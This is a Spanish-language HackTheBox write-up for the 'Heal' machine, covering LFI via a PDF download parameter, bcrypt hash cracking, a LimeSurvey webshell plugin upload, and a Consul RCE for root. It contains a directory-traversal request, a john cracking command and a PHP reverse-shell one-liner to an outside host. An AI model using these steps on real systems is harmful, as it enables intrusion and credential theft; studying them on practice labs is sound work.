---
title: HEAL HTB
published: 2025-01-20
description: Resolviendo la maquina Heal de HackTheBox.
tags: [HTB, Linux, RCE, LFI, SSH]
image: "./PortadaHeal.jpg"
category: WriteUp
draft: False
---
# Reconocimiento

Empezaremos el reconocimiento de la maquina para saber que puerto estna abiertos y que servicios estan corriendo, usando nuestra herramienta de confianza la cual es __NMAP__ 

```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.46 -oG allports
```


![Firts](./Pasted%20image%2020250115222449.jpeg)

El reconocimiento no muestra que tenemos dos puertos abiertos, que son los siguientes:  
```bash
22/tcp  ssh
80/tcp  http
```

Para saber que tipo de servicio están ejecutándose a través de esto puertos  usaremos __NMAP__ de nuevo 

```bash
 namp -sSV -p22,80 10.10.11.46 -oN Ports
```

![Pasted image](./Pasted%20image%2020250115222500.jpeg)
Ok tenemos `ssh` y `nginx` con la versión `1.18.0`  la cual esta un poco desactualizada pero en este caso no supone un riego 

## Visitando la pagina 

Para que la pagina nos resuelva recuerda modificar tu `/etc/hosts` con las siguientes direcciones 
```bash
10.10.11.46 heal.htb
10.10.11.46 api.heal.htb
```
![Pasted image](./Pasted%20image%2020250115222425.jpeg)

Nos recibe este hermoso Login el cual podemos probar si es vulnerable a inyecciones __SQL__ o __NoSQL__, pero ya te adelanto que no los es 

![Pasted image](./Pasted%20image%2020250115223013.jpeg)

Podemos usar __whatweb__ para conocer que tipos de tecnologías implementa la pagina 
```bash
whatweb 10.10.11.46
```

![Pasted image](./Pasted%20image%2020250115223144.jpeg)
Pero no tenemos gran novedad así que lo mejor es seguir explorando la pagina.

Nos registraremos a través del link que tiene la leyenda de " __NEW HERE? SING UP__ " e iniciaremos sección. Una vez dentro la pagina sirve para crear currículos en la cual llenas los datos y los exporta en PDF  

![Pasted image](./Pasted%20image%2020250115223445.jpeg)

Siempre que una pagina web trata con archivos es importante validar que lo hacer bien ya que si no es así tenemos de donde iniciar el ataque  

## Interceptando el PDF 

Interceptaremos la petición que se realiza cuando exportamos el PDF con este botón utilizando BurpSuite y foxyProxy 
![Pasted image](./Pasted%20image%2020250115223705.jpeg)

Esto es lo primero que nos muestra la verdad nada interesante por ahora
![Pasted image ](./Pasted%20image%2020250115223752.jpeg)

Aqui tenemos algo que nos puede interesar, la parte del 
```php
/download?filename=
```

Por lo general son vulnerables a un `LFI`

![Pasted image](./Pasted%20image%2020250115223905.jpeg)


Y llegamos a la petición que nos interesa, la mandaremos al Repeater 
![Pasted image](./Pasted%20image%2020250115224046.jpeg)


## Explotación LFI 


Como dije anteriormente, cuando vemos un `codigo?variable=` suelen ser vulnerables a los LFI y este caso no es la excepción, modificaremos la petición para que en vez de que busque el PDF que genera, apunte a un archivo diferente como el `/etc/passwd` usando `Directory Traversal` 

```php
GET /download?filename=../../../../../../../etc/passwd
```

![Pasted image](./Pasted%20image%2020250115224248.jpeg)


Podemos leer el `passwd` y con ello encontramos a los siguientes usuario del sistema :

```python
root:x:0:0:root:/root:/bin/bash

ralph:x:1000:1000:ralph:/home/ralph:/bin/bash

postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```


Ok ahora a mirar el archivo del `crontab` . pero en esta ocasión no tenemos nada interesante 
![Pasted image](./Pasted%20image%2020250115224836.jpeg)



# Sub-Dominios 

En esta pagina tenemos hasta ahora 2 sub-dominios lo cuales son los siguientes
```python
heal.htb que # Es el de la pagina principal
api.heal.htn # Ques el el Api que esta por detras 
```

Pero contamos con un tercero el cual lo podemos encontrar en el botón de `survey`
![Pasted image](./Pasted%20image%2020250115225234.jpeg)
![Pasted image](./Pasted%20image%2020250115225243.jpeg)
![Pasted image](./Pasted%20image%2020250115225252.jpeg)


El tercer dominio es el de 
```python
take-survey.heal.htb # Agregalo a tu /etc/hosts
```

No tenemos mucho que explorar aquí, así que realizaremos un descubrimiento de directorios con `wfuzz`

```bash
$  wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://take-survey.heal.htb/FUZZ --hc 404,403
```

Con el cual podemos encontrar una dirección de `Admin`
al ponerlo en el navegador nos mostrara un panel de inicio de sesión 

![Pasted image](./Pasted%20image%2020250115225544.jpeg)


No solo eso en la dirección de `index.php` , nos dan a conocer que el usuario `ralph` es administrador de la pagina 

![Pasted image](./Pasted%20image%2020250115225711.jpeg)


## Sub-Dominio api.heal.htb

Podemos visitar el dominio de __api.heal.htb__ y encontraremos que tiene una versión 7.1.4 

![Pasted image](./Pasted%20image%2020250115225859.jpeg)


Investigando un poco para saber si existe una vulnerabilidad critica en algunos de los servicios de __RAILS__ o de __LiveSurvey__ no encontré nada pero `rails` al ser una Api tiene archivos de configuración los cuales son los siguientes 

1. **config/application.rb**: Este archivo contiene la configuración principal de la aplicación Rails. Puedes establecer configuraciones globales que se aplican a toda la aplicación aquí.
2. **config/environments/**: Aquí encontrarás archivos de configuración específicos para cada entorno (development, test, production). Estos archivos permiten configurar el comportamiento de la aplicación según el entorno en el que se esté ejecutando.
3. **config/routes.rb**: Define las rutas de la aplicación, especificando cómo se mapean las URLs a los controladores y acciones correspondientes.
4. **config/database.yml**: Contiene la configuración de las bases de datos para los diferentes entornos (development, test, production). Aquí defines los detalles de conexión a la base de datos.
5. **config/secrets.yml**: Almacena secretos y claves de configuración sensibles que se utilizan en la aplicación. A partir de Rails 5, se recomienda usar credentials.yml.enc para manejar secretos de manera más segura.
6. **config/initializers/**: Este directorio contiene archivos de inicialización que se ejecutan cuando se inicia la aplicación. Puedes agregar archivos aquí para configurar gemas o ajustar configuraciones específicas de tu aplicación.

En este caso trataremos de leer el  **config/database.yml** a través del LFI que encontramos anteriormente. 

## config/database.yml

El archivo nos da mas información, para ser mas preciso nos muestra una nueva ruta a la cual apuntar 
```
storage/development.sqlite3 
```

![Pasted image](./Pasted%20image%2020250115230413.jpeg)


# Usuario Ralph

hemos encontrado al usuario ralph y el hash de su contraseña 

![Pasted image](./Pasted%20image%2020250115230546.jpeg)


Este tipo de hash que inicia con ' $ 2 a $ '  suele ser de tipo `bcrypt` 
![Pasted image](./Pasted%20image%2020250115230740.jpeg)


Bien ahora que sabemos el tipo de encriptación procedemos a usar `john` para romperla 

```bash
 john --format=bcrypt hash --wordlist=/user/share/wordlist/rockyou.txt
```

Y el resultado es 147258369
![Pasted image](./Pasted%20image%2020250116224600.jpeg)


Con esto hecho tenemos las credenciales de `ralph` pero, donde iniciamos sección con estas mismas? 

Intente conectarme por `ssh` pero no son validas, lo cual me llevo al panel de inicio de seccion de `livesurvey`, y resultaron ser validas 

![Pasted image](./Pasted%20image%2020250116224955.jpeg)


Dentro del panel de administración en la parte inferior izquierda nos muestra la versión de la pagina, la cual es la `6.6.4` 
![Pasted image](./Pasted%20image%2020250116225119.jpeg)
![Pasted image](./Pasted%20image%2020250116225123.jpeg)


Buscando por internet encontramos que tiene una vulnerabilidad de RCE, en el siguiente link nos detallan mas el funcionamiento del exploit:

[GitHub - p0dalirius/LimeSurvey-webshell-plugin: A webshell plugin and interactive shell for pentesting a LimeSurvey application.](https://github.com/p0dalirius/LimeSurvey-webshell-plugin)

# Explotación RCE LiveSurvey


Clonamos el repositorio, dentro de este tenemos varias carpetas.
Entra a la carpeta de `plugin` y comprime los dos archivos que se encuentran dentro( `webshell.php` y `config.xml` ) estos dos corresponden a la versión `6.x` lo cual funciona para mi, el zip que se genere ese tendrás que instalar en la página ![Pasted image](./Pasted%20image%2020250120232247.jpeg)

En la página de Survey dirígete a `Configuration -> Plugins -> Upload & Install` y carga el .zip que anteriormente hicimos.

![Pasted image](./Pasted%20image%2020250120232300.jpeg)

Si todo salió bien te saldrá lo siguiente `The plugin was succesfully installed`

![Pasted image](./Pasted%20image%2020250120232312.jpeg)

Ahora bien para usar el exploit, lo buscaremos en el menú, aparece con el nombre de `WebShell` y daremos clic en el.

![Pasted image](./Pasted%20image%2020250120232331.jpeg)

Y ahora dentro del repositorio tenemos el script de `console.py` le daremos permisos de ejecución y lo ejecutaremos de la siguiente manera:

```bash
$ ./console -t http://take-survey.heal.htb
```

Este script nos proporciona una `web shell` la cual usaremos para entablar una reverse Shell 


```php
php -r '$sock=fsockopen("10.10.16.78",443);shell_exec("sh <&3 >&3 2>&3");'
```

![Pasted image](./Pasted%20image%2020250116230204.jpeg)


y conseguimos nuestra reverse shell
![Pasted image](./Pasted%20image%2020250116230209.jpeg)


Si quieres puedes dar un tratamiento para que las flechas, Crtl L funcione.

```bash 
script /dev/null -c bash

^Z # Ctrl+Z

stty raw -echo; fg

reset xterm

# Ajusta a la medida de tu pantalla 
export TERM=xterm;export SHELL=bash;stty rows 41 columns 192
```


Empezaremos la búsqueda de información privilegiada ya que como www-data no tenemos muchos privilegios 
Tenemos un nuevo usuario que es `ron` el cual encontramos en la carpeta de `home` 
![Pasted image](./Pasted%20image%2020250116230730.jpeg)


Si vemos el contenido de la carpeta `/var/www` no encontraremos con un único archivo el cual no nos da pistas de algo o alguien

![Pasted image](./Pasted%20image%2020250116230735.jpeg)


Procederemos a buscar archivos de configuración de las aplicaciones de `RAILS` o `LiveSurvey`.

Después de una búsqueda podemos encontrar la siguiente información:

El archivo `config.php` en la ruta `/var/www/limesurvey/application/config/config.php` de `LimeSurvey` contiene la configuración principal de la aplicación `LimeSurvey`. Este archivo define varios parámetros esenciales para el funcionamiento de la aplicación, como la configuración de la `base de datos`, `ajustes de seguridad`, rutas de recursos y otras opciones específicas de la instalación.

### **Contenido Típico de** **config.php** **en LimeSurvey:**

1. **Configuración de la Base de Datos**:

○     Tipo de base de datos (por ejemplo, MySQL, PostgreSQL).

○     Host de la base de datos.

○     Nombre de la base de datos.

○     Usuario y contraseña de la base de datos.

2. **Rutas y URLs**:

○     URL base de la aplicación.

○     Caminos a directorios importantes como los de subida de archivos.

3. **Ajustes de Seguridad**:

○     Claves de cifrado.

○     Configuración de sesiones y cookies.

4. **Otras Opciones**:

○     Ajustes de localización e idioma.

○     Configuración de depuración y logging.


Ojo que podemos encontrar Bases de Datos, si miramos el archivo encontraremos credenciales

![Pasted image](./Pasted%20image%2020250116231311.jpeg)


Por suerte la contraseña no esta hardcodeada, pero a quien corresponde esta contraseña?, pues al usuario de `ron` 

Nos conectaremos por `ssh` y con ella la primera Flag 
![Pasted image](./Pasted%20image%2020250116231505.jpeg)
![Pasted image](./Pasted%20image%2020250116231522.jpeg)


Ahora bien dentro de la maquina tenemos algunos puertos abiertos pero nos concentraremos en el puerto 8500 el cual tiene el servicio llamado Cónsul, pero para poder verlo haremos un  `Secure Shell Tunnel`


# El Secure Shell Tunnel de root 

Para realizar el secure shell tunnel aplicaremos el siguiente comando 

```bash
 ssh ron@heal.htb -L 8500:127.0.0.1:8500
 ssh ron@heal.htb -L 8600:127.0.0.1:8600
```

Una vez hecho esto entraremos en nuestro `localhost`  y podremos visualizar el servicio de aqui partiremos a ver la estructura de la pagina

![Pasted image](./Pasted%20image%2020250120205803.jpeg)


Después de revisar y husmear por la pagina encontramos que la versión de Consul es la siguiente:

![Pasted image](./Pasted%20image%2020250120210127.jpeg)


Una búsqueda en search exploit, y encontramos que esta versión tiene una  vulnerabilidad de `RCE` 

![Pasted image](./Pasted%20image%2020250120210257.jpeg)



Nos descargaremos el `.txt` referente a esta vulnerabilidad, esta como `.txt` pero realmente es un script de Python así que cambiamos la extensión del archivo 
![Pasted image](./Pasted%20image%2020250120210321.jpeg)


Lo ejecutamos y nos pide los siguientes requerimientos: `host`, `puerto` , `mi_ip`, `un puerto que queramos` y un `token` que en este caso no es necesario lo dejaremos en `1`
![Pasted image](./Pasted%20image%2020250120210525.jpeg)


ahora bien ante de ejecutar este `script` nos pondremos en escucha por el puerto que especificamos anteriormente 

![Pasted image](./Pasted%20image%2020250120210709.jpeg)


Y `BINGO` el servicio lo esta ejecutando el usuario de `root`  

![Pasted image](./Pasted%20image%2020250120210849.jpeg)

![Pwned](./PwnedHeal.jpg)

## Conclusión 

La maquina fue vulnerable por un `LFI` , el cual esta ubicado al momento de exportar el PDF, y este mismo nos permitió listar el archivo `passwd` y la base de datos de `LiveSurvey`  y así poder ganar acceso a la maquina 

Tener cuidado cuando una pagina tenga una función de descargar archivos por que por lo general no esta sanitizado. 